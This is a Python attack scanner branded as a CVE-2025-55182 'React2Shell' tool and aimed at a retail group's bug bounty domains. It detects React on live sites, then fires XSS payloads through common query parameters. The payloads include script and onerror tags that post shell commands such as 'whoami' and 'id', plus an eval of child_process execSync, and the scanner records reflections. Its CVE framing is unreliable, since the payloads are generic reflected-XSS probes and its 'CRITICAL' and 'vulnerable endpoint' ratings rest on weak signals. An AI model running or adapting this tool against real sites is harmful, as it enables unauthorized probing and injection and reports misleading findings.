#!/usr/bin/env python3
"""
CVE-2025-55182 React2Shell Phase 1 Scanner - FIXED VERSION
A.S. Watson Group Bug Bounty Target Scanner
"""

import requests
import re
import json
import sys
import time
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse

class React2ShellScanner:
    def __init__(self, targets, output_dir="./react_scan", threads=5, timeout=10):
        self.targets = targets
        self.output_dir = output_dir
        self.threads = threads
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # React vulnerability patterns
        self.react_patterns = {
            'devtools': r'__REACT_DEVTOOLS_GLOBAL_HOOK__',
            'react_dom': r'react-dom.*?([0-9]+\.[0-9]+\.[0-9]+)',
            'react_version': r'react@([0-9]+\.[0-9]+\.[0-9]+)',
            'dangerously_set_inner_html': r'dangerouslySetInnerHTML',
            'eval_usage': r'eval\s*\(',
            'inner_html': r'\.innerHTML\s*=',
            'document_write': r'document\.write',
            'create_element': r'React\.createElement'
        }
        
        # React2Shell payloads
        self.react2shell_payloads = [
            '<img src=x onerror="fetch(\'/api/debug\',{method:\'POST\',body:JSON.stringify({cmd:\'whoami\'})})">',
            '<script>fetch("/api/admin",{method:"POST",body:\'{"cmd":"id"}\'})</script>',
            '<div dangerouslySetInnerHTML={{__html:"<script>alert(\'react-compromised\')</script>"}} />',
            '<script>eval("require(\'child_process\').execSync(\'whoami\')")</script>',
            '<iframe src="javascript:fetch(\'/api/exec\',{method:\'POST\',body:\'cmd=uname -a\'})"></iframe>'
        ]
        
        # Common injection points
        self.injection_points = [
            '/search?q={payload}',
            '/login?username={payload}',
            '/contact?name={payload}',
            '/feedback?message={payload}',
            '/profile?bio={payload}',
            '/api/user?name={payload}',
            '/api/search?q={payload}'
        ]
    
    def check_target_responsive(self, target):
        """Check if target is responsive"""
        try:
            response = self.session.get(f'https://{target}', timeout=self.timeout)
            return response.status_code in [200, 301, 302, 403]
        except:
            return False
    
    def detect_react(self, target):
        """Detect React applications and extract information"""
        print(f"[+] Detecting React on {target}")
        
        try:
            response = self.session.get(f'https://{target}', timeout=self.timeout)
            content = response.text
            
            react_info = {
                'target': target,
                'has_react': False,
                'react_version': None,
                'has_devtools': False,
                'dangerous_patterns': [],
                'vulnerability_indicators': []
            }
            
            # Check for React indicators
            for pattern_name, pattern in self.react_patterns.items():
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    if pattern_name == 'devtools':
                        react_info['has_devtools'] = True
                        react_info['vulnerability_indicators'].append('React DevTools in production')
                    elif pattern_name == 'react_version':
                        react_info['react_version'] = matches[0] if matches else None
                    elif pattern_name in ['eval_usage', 'inner_html', 'document_write']:
                        react_info['dangerous_patterns'].append(pattern_name)
                    
                    react_info['has_react'] = True
            
            # Save detailed analysis
            output_file = f"{self.output_dir}/react_analysis_{target.replace('.', '_')}.json"
            with open(output_file, 'w') as f:
                json.dump(react_info, f, indent=2)
            
            # Print summary
            if react_info['has_react']:
                print(f"[✓] React detected on {target}")
                if react_info['react_version']:
                    print(f"    Version: {react_info['react_version']}")
                if react_info['has_devtools']:
                    print(f"[!] CRITICAL: React DevTools enabled in production")
                if react_info['dangerous_patterns']:
                    print(f"[!] Dangerous patterns: {', '.join(react_info['dangerous_patterns'])}")
            else:
                print(f"[✗] No React detected on {target}")
            
            return react_info
            
        except Exception as e:
            print(f"[!] Error analyzing {target}: {str(e)}")
            return None
    
    def test_react2shell_payloads(self, target, react_info):
        """Test React2Shell payloads"""
        print(f"[+] Testing React2Shell payloads on {target}")
        
        results = {
            'target': target,
            'reflected_payloads': [],
            'vulnerable_endpoints': [],
            'potential_exploits': []
        }
        
        for payload in self.react2shell_payloads:
            for injection_point in self.injection_points:
                url = f"https://{target}{injection_point.format(payload=payload)}"
                
                try:
                    response = self.session.get(url, timeout=self.timeout)
                    
                    # Check if payload is reflected
                    if payload in response.text:
                        results['reflected_payloads'].append({
                            'payload': payload,
                            'endpoint': injection_point,
                            'url': url,
                            'response_length': len(response.text)
                        })
                        print(f"[!] PAYLOAD REFLECTED: {url}")
                    
                    # Check for React errors
                    if any(error in response.text.lower() for error in ['react error', 'cannot read property', 'undefined is not an object']):
                        results['vulnerable_endpoints'].append({
                            'endpoint': injection_point,
                            'url': url,
                            'error_type': 'React runtime error'
                        })
                        print(f"[!] React error detected: {url}")
                    
                    time.sleep(0.1)  # Rate limiting
                    
                except Exception as e:
                    continue
        
        # Save results
        output_file = f"{self.output_dir}/react2shell_test_{target.replace('.', '_')}.json"
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        return results
    
    def scan_target(self, target):
        """Main scanning function for a single target"""
        print(f"\n{'='*50}")
        print(f"Scanning: {target}")
        print(f"{'='*50}")
        
        # Check if target is responsive
        if not self.check_target_responsive(target):
            print(f"[✗] {target} is not responsive")
            return None
        
        # Detect React
        react_info = self.detect_react(target)
        if not react_info or not react_info['has_react']:
            print(f"[!] Skipping {target} - No React detected")
            return None
        
        # Test React2Shell payloads
        shell_results = self.test_react2shell_payloads(target, react_info)
        
        return {
            'target': target,
            'react_info': react_info,
            'shell_results': shell_results
        }
    
    def generate_summary_report(self, results):
        """Generate comprehensive summary report"""
        print(f"\n[+] Generating summary report...")
        
        summary = {
            'scan_info': {
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'total_targets': len(self.targets),
                'targets_with_react': len([r for r in results if r and r['react_info']['has_react']]),
                'targets_with_devtools': len([r for r in results if r and r['react_info']['has_devtools']]),
                'reflected_payloads': len([r for r in results if r and r['shell_results']['reflected_payloads']]),
                'vulnerable_endpoints': len([r for r in results if r and r['shell_results']['vulnerable_endpoints']])
            },
            'high_priority_targets': [],
            'detailed_results': results
        }
        
        # Identify high-priority targets
        for result in results:
            if result:
                priority_score = 0
                if result['react_info']['has_devtools']:
                    priority_score += 10
                if result['shell_results']['reflected_payloads']:
                    priority_score += 5
                if result['react_info']['dangerous_patterns']:
                    priority_score += 3
                
                if priority_score >= 5:
                    summary['high_priority_targets'].append({
                        'target': result['target'],
                        'priority_score': priority_score,
                        'reasons': []
                    })
                    
                    if result['react_info']['has_devtools']:
                        summary['high_priority_targets'][-1]['reasons'].append('React DevTools in production')
                    if result['shell_results']['reflected_payloads']:
                        summary['high_priority_targets'][-1]['reasons'].append('Reflected payloads')
                    if result['react_info']['dangerous_patterns']:
                        summary['high_priority_targets'][-1]['reasons'].append(f"Dangerous patterns: {result['react_info']['dangerous_patterns']}")
        
        # Save summary
        summary_file = f"{self.output_dir}/scan_summary.json"
        with open(summary_file, 'w') as f:
            json.dump(summary, f, indent=2)
        
        # Print summary
        print(f"\n{'='*60}")
        print(f"SCAN SUMMARY")
        print(f"{'='*60}")
        print(f"Total targets scanned: {summary['scan_info']['total_targets']}")
        print(f"React applications found: {summary['scan_info']['targets_with_react']}")
        print(f"Targets with DevTools: {summary['scan_info']['targets_with_devtools']}")
        print(f"Reflected payloads: {summary['scan_info']['reflected_payloads']}")
        print(f"Vulnerable endpoints: {summary['scan_info']['vulnerable_endpoints']}")
        
        if summary['high_priority_targets']:
            print(f"\nHIGH PRIORITY TARGETS:")
            for target in summary['high_priority_targets']:
                print(f"  - {target['target']} (Score: {target['priority_score']})")
                for reason in target['reasons']:
                    print(f"    * {reason}")
        
        print(f"\nDetailed results saved to: {summary_file}")
        
        return summary
    
    def run_scan(self):
        """Main scanning function"""
        print("Starting A.S. Watson Group CVE-2025-55182 Phase 1 Enhanced Scan")
        print(f"Targets: {len(self.targets)}")
        print(f"Output directory: {self.output_dir}")
        
        results = []
        
        # Scan targets concurrently
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_target = {executor.submit(self.scan_target, target): target for target in self.targets}
            
            for future in as_completed(future_to_target):
                target = future_to_target[future]
                try:
                    result = future.result()
                    results.append(result)
                except Exception as exc:
                    print(f"[!] {target} generated an exception: {exc}")
        
        # Generate summary
        summary = self.generate_summary_report(results)
        
        print(f"\n[+] Phase 1 scan completed!")
        return summary

def main():
    parser = argparse.ArgumentParser(description='CVE-2025-55182 React2Shell Phase 1 Scanner')
    parser.add_argument('--targets', nargs='+', required=True, help='Target domains to scan')
    parser.add_argument('--output', default='./react_scan', help='Output directory')
    parser.add_argument('--threads', type=int, default=5, help='Number of concurrent threads')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds')
    
    args = parser.parse_args()
    
    # Create output directory
    import os
    os.makedirs(args.output, exist_ok=True)
    
    # Initialize scanner
    scanner = React2ShellScanner(
        targets=args.targets,
        output_dir=args.output,
        threads=args.threads,
        timeout=args.timeout
    )
    
    # Run scan
    summary = scanner.run_scan()
    
    return summary

if __name__ == '__main__':
    main()
